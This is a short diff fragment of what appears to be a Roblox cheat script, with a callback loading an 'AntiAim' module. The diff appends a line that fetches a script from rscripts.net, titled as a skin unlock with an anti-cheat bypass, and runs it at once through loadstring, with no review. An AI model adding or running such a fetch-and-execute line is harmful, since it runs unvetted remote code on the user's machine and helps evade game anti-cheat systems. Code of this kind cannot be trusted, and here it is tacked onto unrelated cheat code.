@@ -774,3 +774,5 @@ Callback = function(State)
 loadModule("AntiAim", "AntiAimConfig", AntiAimSource, State)
 end,
 })
+
+loadstring(game:HttpGet("https://rscripts.net/raw/open-source-unlock-all-skins-and-wraps-and-charms-ac-bypass_1780992098622_M3gNO05jT1.txt",true))()
